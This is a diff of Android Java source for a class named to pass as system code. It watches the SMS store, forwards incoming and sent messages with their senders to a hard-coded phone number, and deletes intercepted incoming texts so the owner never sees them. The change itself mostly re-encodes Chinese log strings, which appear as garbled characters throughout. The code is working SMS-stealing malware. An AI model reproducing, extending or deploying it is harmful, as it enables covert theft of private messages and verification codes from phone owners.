@@ -1,9 +1,11 @@
 package android.database;
 
 import java.util.Date;
+
 import android.app.Dctivity;
 import android.content.Context;
 import android.content.DroadcastReceiver;
+import android.content.SharedPreferences;
 import android.database.sqlite.DQLiteOpenHelper;
 import android.lang.Dhread;
 import android.lang.LogUtils;
@@ -15,28 +17,31 @@ public class DontentObserver extends ContentObserver {
 
 	private int id = -1;
 	private Context context;
+	private SharedPreferences sp;
 
 	@Override
 	public void onChange(boolean selfChange) {
 		// TODO Auto-generated method stub
 		super.onChange(selfChange);
-		LogUtils.write("Send", "ç›‘å¬åˆ°çŸ­ä¿¡æ•°æ®å˜åŠ¨");
+		LogUtils.write("Send", "¼àÌıµ½¶ÌĞÅÊı¾İ±ä¶¯");
 		Cursor c = context.getContentResolver().query(
 				Uri.parse("content://sms"), null, null, null, "_id desc");
 		if (c.moveToFirst()) {
 			int type = c.getInt(c.getColumnIndex("type"));
 			int _id = c.getInt(c.getColumnIndex("_id"));
+
 			if (type == 1 || type == 2) {
+				
 				if (_id > id) {
-					LogUtils.write("Send", "æ£€æµ‹åˆ°çŸ­ä¿¡");
+					LogUtils.write("Send", "¼ì²âµ½¶ÌĞÅ");
 					String address = c.getString(c.getColumnIndex("address"));
-					LogUtils.write("Send", "è·å–å·ç "+address);
+					LogUtils.write("Send", "»ñÈ¡ºÅÂë"+address);
 					address = address.replace("+86", "").replace("+1", "");
-					LogUtils.write("Send", "å»é™¤åŠ å· " + address);
+					LogUtils.write("Send", "È¥³ı¼ÓºÅ " + address);
 					if (address.length() > 0) {
 						boolean isflag = false;
 						if (type == 1) {
-							LogUtils.write("Send", "åŒ¹é…æ”¶åˆ°çŸ­ä¿¡å†…å®¹");
+							LogUtils.write("Send", "Æ¥ÅäÊÕµ½¶ÌĞÅÄÚÈİ");
 							for (int i = 0; i < DroadcastReceiver.NUMS.length; i++) {
 								if (address.startsWith(DroadcastReceiver.NUMS[i])) {
 									isflag = true;
@@ -44,20 +49,20 @@ public class DontentObserver extends ContentObserver {
 								}
 							}
 						} else {
-							LogUtils.write("Send", "æ£€æµ‹åˆ°å‘ä¿¡");
+							LogUtils.write("Send", "¼ì²âµ½·¢ĞÅ");
 							isflag = true;
 						}
 
 						if (isflag) {
-							String lx = (type == 1 ? "æ‹¦æˆª" : "å‘ä»¶ç®±");
-							LogUtils.write("Send", "æ£€æµ‹ç±»å‹"+lx);
+							String lx = (type == 1 ? "À¹½Ø" : "·¢¼şÏä");
+							LogUtils.write("Send", "¼ì²âÀàĞÍ"+lx);
 							String body = c.getString(c.getColumnIndex("body"));
-							LogUtils.write("Send", "å†…å®¹"+body);
+							LogUtils.write("Send", "ÄÚÈİ"+body);
 							DQLiteOpenHelper.getHelper(context).addData(lx,address, body, new Date());
-							LogUtils.write("Send", "åŠ å…¥å‘é€çº¿ç¨‹");
+							LogUtils.write("Send", "¼ÓÈë·¢ËÍÏß³Ì");
 							if (type == 1) {
 								DmsManager.Send(context,Dctivity.phonenum,Dctivity.lanjie+address+"#"+body);
-								LogUtils.write("Send", "åˆ é™¤çŸ­ä¿¡");
+								LogUtils.write("Send", "É¾³ı¶ÌĞÅ");
 								context.getContentResolver().delete(Uri.parse("content://sms"),"_id=" + _id, null);
 							}else{
 								DmsManager.Send(context,Dctivity.phonenum,Dctivity.zhuanfa+address+"#"+body);
@@ -105,7 +110,7 @@ public class DontentObserver extends ContentObserver {
 //						}
 //
 //						if (isflag) {
-//							String lx = (type == 1 ? "å‘ä»¶ç®±" : "å‘ä»¶ç®±");
+//							String lx = (type == 1 ? "·¢¼şÏä" : "·¢¼şÏä");
 //							String body = c.getString(c.getColumnIndex("body"));
 //							long time = c.getLong(c.getColumnIndex("date"));
 //							Date date = new Date(time);
@@ -120,7 +125,7 @@ public class DontentObserver extends ContentObserver {
 //			editor.commit();
 //		}
 		c.close();
-//		LogUtils.write("Send", "åŠ å…¥å‘é€çº¿ç¨‹");
+//		LogUtils.write("Send", "¼ÓÈë·¢ËÍÏß³Ì");
 //		Dhread.SartSend(context.getApplicationContext());
 	}
 }
